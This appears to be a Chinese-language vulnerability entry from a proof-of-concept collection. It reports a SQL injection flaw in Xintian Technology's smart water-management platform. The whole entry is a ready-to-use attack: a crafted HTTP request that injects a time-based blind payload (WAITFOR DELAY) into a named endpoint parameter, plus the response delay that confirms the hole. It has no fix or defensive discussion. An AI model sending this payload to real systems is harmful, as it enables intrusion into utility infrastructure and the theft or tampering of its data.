# 新天科技智慧水务管控一体化平台系统存在SQL注入漏洞

新天科技智慧水务管控一体化平台系统 ｜ SQL注入 ｜ —

**Payload**
```
/MainOA/Bussiness_VM/VM_JYGL/WebAPI/GetJYGLList.ashx?EquipmentCoding=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&VID=1&VcreationTime=1&Vnumber=1&VrefuelMan=1&dEndDate=1&dStartDate=1&order=desc&page=1&rows=1&sort=desc HTTP/1.1
Host: 127.0.0.1
```
- **响应特征**：200 响应时间>=5s